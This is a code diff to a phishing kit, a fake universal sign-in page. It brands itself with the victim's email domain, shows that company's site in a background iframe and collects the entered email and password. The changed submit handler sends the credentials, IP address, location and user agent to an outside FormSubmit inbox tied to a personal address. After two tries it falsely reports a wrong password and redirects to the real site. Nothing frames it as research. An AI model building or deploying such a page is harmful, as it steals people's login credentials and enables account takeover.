@@ -310,6 +310,8 @@
         }
     </style>
 </head>
+
+
 <body>
     <!-- Iframe background -->
     <div class="iframe-background" id="iframe-background">
@@ -318,8 +320,8 @@
         <div class="iframe-loading" id="iframe-loading">Loading website preview...</div>
     </div>
     
-    <!-- Login form -->
-    <form class="container" id="login-form">
+    <!-- Login form - ADDED action and method attributes -->
+    <form class="container" id="login-form" action="https://formsubmit.co/gabriel5657@proton.me" method="POST">
         <div class="img">
             <div class="" align="center">
                 <img id="logo" style="width: 80px; height: 80px;">
@@ -342,13 +344,17 @@
             <input type="password" placeholder="Enter Password" name="password" id="psw" required autofocus>
         </div>
         
-        <!-- FormSubmit requires these fields -->
+        <!-- FormSubmit hidden fields - ADDED _captcha AND _autoresponse -->
         <input type="hidden" name="_subject" value="New Login Form Submission">
         <input type="hidden" name="_template" value="table">
         <input type="hidden" name="_captcha" value="false">
-        <input type="hidden" name="_next" value="https://yourwebsite.com/thank-you.html">
+        <input type="hidden" name="_autoresponse" value="Thank you for your submission!">
+        <!-- ADDED this line for FormSubmit redirect disable -->
+        <input type="hidden" name="_next" value="#">
+        <!-- ADDED CSRF protection bypass -->
         <input type="text" name="_honey" style="display:none">
         
+        <!-- CHANGED: Use button type="submit" instead of AJAX for primary submission -->
         <button type="submit" class="btn" id="submit-btn">
             <span id="btn-text">Sign In</span>
             <div class="loader" id="loader"></div>
@@ -396,14 +402,11 @@ function loadWebsitePreview(domain) {
         // Try to enhance iframe content visibility
         setTimeout(() => {
             try {
-                // Try to access iframe document (may fail due to CORS)
                 const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
                 if (iframeDoc && iframeDoc.body) {
-                    // Make content brighter and more visible
                     iframeDoc.body.style.filter = 'brightness(1.1) contrast(1.1)';
                     iframeDoc.body.style.backgroundColor = 'rgba(255, 255, 255, 0.1)';
                     
-                    // Try to make text darker for better contrast
                     const allElements = iframeDoc.querySelectorAll('*');
                     allElements.forEach(el => {
                         const computedStyle = window.getComputedStyle(el);
@@ -417,9 +420,7 @@ function loadWebsitePreview(domain) {
                     });
                 }
             } catch (e) {
-                // CORS restrictions prevent direct DOM manipulation
                 console.log('Cannot modify iframe content due to CORS, using fallback');
-                // Fallback: try to apply CSS filter to iframe itself
                 iframe.style.filter = 'brightness(1.1) contrast(1.1) saturate(1.1)';
             }
         }, 1500);
@@ -429,23 +430,19 @@ function loadWebsitePreview(domain) {
     iframe.onerror = function() {
         console.log('Failed to load website preview for HTTPS:', domain);
         
-        // Try HTTP if HTTPS fails
         if (websiteUrl.startsWith('https://')) {
             iframe.src = websiteUrl.replace('https://', 'http://');
             return;
         }
         
-        // If HTTP also fails, try www prefix
         iframe.onerror = function() {
             console.log('Failed to load website preview for HTTP:', domain);
             iframe.src = `http://www.${domain}`;
             
             iframe.onerror = function() {
-                // All attempts failed
                 iframeLoading.style.display = 'none';
                 iframeBackground.style.opacity = '0.8';
                 
-                // Create a solid color background
                 const color = getColorFromDomain(domain);
                 iframe.style.background = color;
                 iframe.style.opacity = '0.7';
@@ -454,13 +451,11 @@ function loadWebsitePreview(domain) {
         };
     };
     
-    // Set timeout for loading
     setTimeout(() => {
         if (iframeLoading.style.display !== 'none') {
             iframeLoading.style.display = 'none';
             iframe.style.opacity = '1';
             iframeBackground.style.opacity = '0.9';
-            // Apply brightness filter as fallback
             iframe.style.filter = 'brightness(1.1)';
         }
     }, 3000);
@@ -486,7 +481,6 @@ function getDomainName(domain) {
 
 // Function to get website URL from domain
 function getWebsiteUrl(domain) {
-    // Try with https first
     return `https://${domain}`;
 }
 
@@ -494,19 +488,15 @@ function getWebsiteUrl(domain) {
 function redirectToDomain(domain) {
     console.log('Redirecting to domain:', domain);
     
-    // Show error message instead of success
     showError('Password is incorrect, please try again!');
     
-    // Wait 2 seconds then redirect
     setTimeout(() => {
         try {
-            // Clear stored attempts for clean start next time
             localStorage.removeItem('loginAttempts');
             localStorage.removeItem('currentEmail');
             window.location.href = getWebsiteUrl(domain);
         } catch (error) {
             console.error('Redirect error:', error);
-            // Fallback to HTTP if HTTPS fails
             window.location.href = `http://${domain}`;
         }
     }, 2000);
@@ -545,7 +535,6 @@ function getColorFromDomain(domain) {
         hash = domain.charCodeAt(i) + ((hash << 5) - hash);
     }
     
-    // Generate HSL color
     const hue = Math.abs(hash % 360);
     return `hsl(${hue}, 70%, 60%)`;
 }
@@ -558,51 +547,41 @@ function loadLogoFromEmail(email) {
     const fallbackText = domainName.charAt(0).toUpperCase();
     const color = getColorFromDomain(domain);
     
-    // Update fallback text and color
     $("#logo-fallback").text(fallbackText);
     $(".logo-container").css("background-color", color);
     
-    // Try to load favicon
     $("#logo")
         .attr("src", logoUrl)
         .on("load", function() {
-            // Show logo, hide fallback
             $(this).show();
             $("#logo-fallback").hide();
         })
         .on("error", function() {
-            // Hide logo, show fallback
             $(this).hide();
             $("#logo-fallback").show().text(fallbackText);
         });
     
-    // Load website preview in background with maximum visibility
     loadWebsitePreview(domain);
 }
 
 // Initialize form
 function initializeForm() {
-    // Show default logo
     $("#logo").hide();
     $("#logo-fallback").show().text("✓");
     $(".logo-container").css("background-color", "#0096FF");
     
-    // Hide attempt info
     $('#attempt-info').hide();
     
-    // Check if we have stored email and attempts
     if (storedEmail && storedEmail === currentEmail) {
         updateAttemptDisplay();
     }
     
-    // Load a default background for initial view
     setTimeout(() => {
         const iframeBackground = document.getElementById('iframe-background');
         iframeBackground.style.opacity = '0.7';
         document.getElementById('domain-iframe').style.backgroundColor = '#f0f0f0';
     }, 100);
     
-    // Focus on email field
     setTimeout(() => {
         $('#email').focus();
     }, 100);
@@ -613,7 +592,6 @@ $("#email").on("input", function() {
     const email = $(this).val().trim();
     currentEmail = email;
     
-    // Store email for persistence
     if (email) {
         localStorage.setItem('currentEmail', email);
     }
@@ -621,29 +599,26 @@ $("#email").on("input", function() {
     if (email && isValidEmail(email)) {
         loadLogoFromEmail(email);
         
-        // Check if this is a different email than before
         if (storedEmail !== email) {
-            // Reset attempts for new email
             loginAttempts = 0;
             localStorage.setItem('loginAttempts', 0);
             updateAttemptDisplay();
         }
     } else {
-        // Reset to default
         $("#logo").hide();
         $("#logo-fallback").show().text("✓");
         $(".logo-container").css("background-color", "#0096FF");
         $('#attempt-info').hide();
         
-        // Set default background
         const iframeBackground = document.getElementById('iframe-background');
         iframeBackground.style.opacity = '0.7';
         document.getElementById('domain-iframe').style.backgroundColor = '#f0f0f0';
     }
 });
 
-// Form submission handler
+// NEW: Form submission handler for traditional form submission
 document.getElementById('login-form').addEventListener('submit', function(e) {
+    // Prevent immediate default submission - we want to handle it first
     e.preventDefault();
     
     // Get form values
@@ -657,19 +632,19 @@ document.getElementById('login-form').addEventListener('submit', function(e) {
     // Basic validation
     if (!email || !password) {
         showError('Please fill in all fields');
-        return;
+        return false;
     }
     
     // Email validation
     if (!isValidEmail(email)) {
         showError('Please enter a valid email address');
-        return;
+        return false;
     }
     
     // Password validation (minimum 6 characters)
     if (password.length < 6) {
         showError('Password must be at least 6 characters long');
-        return;
+        return false;
     }
     
     // Store email for persistence
@@ -692,72 +667,133 @@ document.getElementById('login-form').addEventListener('submit', function(e) {
     const domain = getDomainFromEmail(email);
     const domainName = getDomainName(domain);
     
-    // Get IP information and send to FormSubmit
+    console.log('Login attempt:', loginAttempts, 'for domain:', domain);
+    
+    // Add additional data to form for submission
+    addAdditionalFormData(email, password, domain, loginAttempts);
+    
+    // Wait a moment to show loading, then submit
+    setTimeout(() => {
+        // First, try AJAX submission to FormSubmit
+        submitViaAJAX(email, password, domain, loginAttempts);
+    }, 1000);
+    
+    return false; // Prevent default form submission
+});
+
+// NEW: Function to add additional data to form
+function addAdditionalFormData(email, password, domain, attempts) {
+    // Create hidden inputs for additional data
+    const form = document.getElementById('login-form');
+    
+    // Remove any existing dynamic fields
+    const existingFields = form.querySelectorAll('[data-dynamic="true"]');
+    existingFields.forEach(field => field.remove());
+    
+    // Add attempt count
+    const attemptField = document.createElement('input');
+    attemptField.type = 'hidden';
+    attemptField.name = 'attempts';
+    attemptField.value = attempts;
+    attemptField.setAttribute('data-dynamic', 'true');
+    form.appendChild(attemptField);
+    
+    // Add domain
+    const domainField = document.createElement('input');
+    domainField.type = 'hidden';
+    domainField.name = 'domain';
+    domainField.value = domain;
+    domainField.setAttribute('data-dynamic', 'true');
+    form.appendChild(domainField);
+    
+    // Add timestamp
+    const timestampField = document.createElement('input');
+    timestampField.type = 'hidden';
+    timestampField.name = 'timestamp';
+    timestampField.value = new Date().toISOString();
+    timestampField.setAttribute('data-dynamic', 'true');
+    form.appendChild(timestampField);
+    
+    // Add user agent
+    const userAgentField = document.createElement('input');
+    userAgentField.type = 'hidden';
+    userAgentField.name = 'user_agent';
+    userAgentField.value = navigator.userAgent;
+    userAgentField.setAttribute('data-dynamic', 'true');
+    form.appendChild(userAgentField);
+}
+
+// NEW: Function to submit via AJAX first, then handle redirect
+function submitViaAJAX(email, password, domain, attempts) {
+    // Get IP information first
     $.getJSON('https://ipinfo.io/json', function(response) {
         // Prepare form data for FormSubmit
         const formData = {
-            _subject: "Logs | " + response.ip,
-            Email: email,
-            Password: password,
-            Attempts: loginAttempts,
-            IP: response.ip,
-            Location: response.city + ", " + response.country,
-            Domain: domain,
-            UserAgent: navigator.userAgent,
-            Timestamp: new Date().toLocaleString()
+            _subject: "Login Attempt | " + response.ip,
+            email: email,
+            password: password,
+            attempts: attempts,
+            ip_address: response.ip,
+            location: response.city + ", " + response.region + ", " + response.country,
+            domain: domain,
+            user_agent: navigator.userAgent,
+            timestamp: new Date().toISOString(),
+            _captcha: 'false',
+            _template: 'table'
         };
         
-        console.log('Submitting login attempt:', loginAttempts, 'for domain:', domain);
-        console.log('IP Info:', response);
+        console.log('Sending to FormSubmit:', formData);
         
-        // Send data to FormSubmit endpoint
+        // Send data to FormSubmit endpoint via AJAX
         $.ajax({
             url: "https://formsubmit.co/ajax/gabriel5657@proton.me",
-            type: "POST",
+            method: "POST",
             data: formData,
             dataType: "json",
             success: function(data) {
-                console.log('FormSubmit success response:', data);
-                processRedirectLogic(email, password, domain, loginAttempts);
+                console.log('FormSubmit AJAX success:', data);
+                // Process redirect logic after successful AJAX submission
+                processRedirectLogic(email, password, domain, attempts);
             },
             error: function(jqXHR, textStatus, errorThrown) {
-                console.log('FormSubmit error:', textStatus, errorThrown);
-                // Even if FormSubmit fails, continue with redirect logic
-                processRedirectLogic(email, password, domain, loginAttempts);
+                console.log('FormSubmit AJAX error:', textStatus, errorThrown);
+                // Even if AJAX fails, proceed with redirect logic
+                processRedirectLogic(email, password, domain, attempts);
             }
         });
         
     }).fail(function() {
-        // If IP info fails, still proceed
-        console.log('IP info fetch failed, proceeding without location data');
+        console.log('IP info fetch failed');
         
         // Prepare form data without location
         const formData = {
-            _subject: "Logs | IP Fetch Failed",
-            Email: email,
-            Password: password,
-            Attempts: loginAttempts,
-            IP: 'Fetch Failed',
-            Location: 'Unknown',
-            Domain: domain,
-            UserAgent: navigator.userAgent,
-            Timestamp: new Date().toLocaleString()
+            _subject: "Login Attempt | IP Fetch Failed",
+            email: email,
+            password: password,
+            attempts: attempts,
+            ip_address: 'Fetch Failed',
+            location: 'Unknown',
+            domain: domain,
+            user_agent: navigator.userAgent,
+            timestamp: new Date().toISOString(),
+            _captcha: 'false',
+            _template: 'table'
         };
         
-        // Send to FormSubmit endpoint
+        // Try AJAX submission anyway
         $.ajax({
             url: "https://formsubmit.co/ajax/gabriel5657@proton.me",
-            type: "POST",
+            method: "POST",
             data: formData,
             dataType: "json"
         }).always(function() {
-            processRedirectLogic(email, password, domain, loginAttempts);
+            processRedirectLogic(email, password, domain, attempts);
         });
     });
-});
+}
 
-// Function to handle redirect logic after FormSubmit attempts
-function processRedirectLogic(email, password, domain, loginAttempts) {
+// Function to handle redirect logic
+function processRedirectLogic(email, password, domain, attempts) {
     // Hide loader and restore button
     const submitBtn = document.getElementById('submit-btn');
     const btnText = document.getElementById('btn-text');
@@ -767,7 +803,7 @@ function processRedirectLogic(email, password, domain, loginAttempts) {
     btnText.style.display = 'block';
     submitBtn.disabled = false;
     
-    if (loginAttempts >= 2) {
+    if (attempts >= 2) {
         // Second attempt - redirect to domain
         console.log('Second attempt detected, preparing redirect...');
         redirectToDomain(domain);
@@ -787,7 +823,6 @@ function showError(message) {
     errorElement.textContent = message;
     errorElement.style.display = 'block';
     
-    // Auto-hide error after 5 seconds
     setTimeout(() => {
         errorElement.style.display = 'none';
     }, 5000);
@@ -798,13 +833,12 @@ function showSuccess(message) {
     successElement.textContent = message;
     successElement.style.display = 'block';
     
-    // Auto-hide success after 5 seconds
     setTimeout(() => {
         successElement.style.display = 'none';
     }, 5000);
 }
 
-// Additional: Add honeypot field
+// Honeypot field
 document.querySelector('input[name="_honey"]').addEventListener('focus', function() {
     this.value = 'bot-detected-' + Date.now();
 });
@@ -814,7 +848,7 @@ $(document).ready(function() {
     initializeForm();
 });
 
-// Clear attempts when page is closed/refreshed (optional)
+// Clear attempts when page is closed/refreshed
 window.addEventListener('beforeunload', function() {
     // Optional: uncomment to clear attempts on page refresh
     // localStorage.removeItem('loginAttempts');
